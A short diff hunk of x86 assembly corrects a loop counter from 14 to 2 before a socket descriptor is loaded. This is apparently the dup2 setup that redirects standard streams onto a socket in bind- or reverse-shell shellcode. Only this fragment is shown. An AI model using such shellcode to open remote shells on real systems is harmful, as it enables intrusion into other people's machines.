@@ -149,7 +149,7 @@ _start:
 	;  ecx := 2 -> 1 -> 0						;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-	push byte 14
+	push byte 2
 	pop ecx		; ecx := 2
 	mov ebx, eax	; ebx := sockfd
 	
